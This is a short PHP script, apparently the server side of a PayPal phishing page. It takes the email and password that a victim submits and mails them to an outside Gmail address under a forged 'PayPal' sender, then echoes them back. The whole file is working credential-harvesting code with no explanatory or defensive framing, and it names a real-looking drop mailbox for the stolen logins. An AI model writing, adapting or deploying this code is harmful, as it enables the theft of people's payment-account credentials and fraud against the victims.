<?php 
$email = $_POST['email'];
$pwd = $_POST['pwd'];

$mail = "paypal-service@gmail.com";
$email_to = "burgfranklin45@gmail.com";
$nom = "PayPal";
$mail = "paypal-service@gmail.com";
$sujet = "coordonnées paypal";
$msg = $email ."  ". $pwd;

    //Création du header de l'e-mail.
    $header = 'MIME-Version: 1.0' . "\n";
    $header .= 'Content-type: text/html; charset=utf-8' . "\n";
    $header .= 'From: <' . $mail . '>' . "\n";
    $header .= "Reply-to: " . $nom . " <" . $mail . ">" . "\r\n";

    $message = '
        <html>
            <head>
                <meta charset="utf-8">
            </head>
            <body>
                <h2>Prise de contact</h2>
                <p>
                    Nom : <strong>' . $nom . '</strong> <br>
                    Email : ' . $mail . ' <br>
                    Message : ' . $msg . '
                </p>
            </body>
        </html>
    ';

    mail($email_to, $sujet, $message, $header);

    echo $email ."  ". $pwd;
?>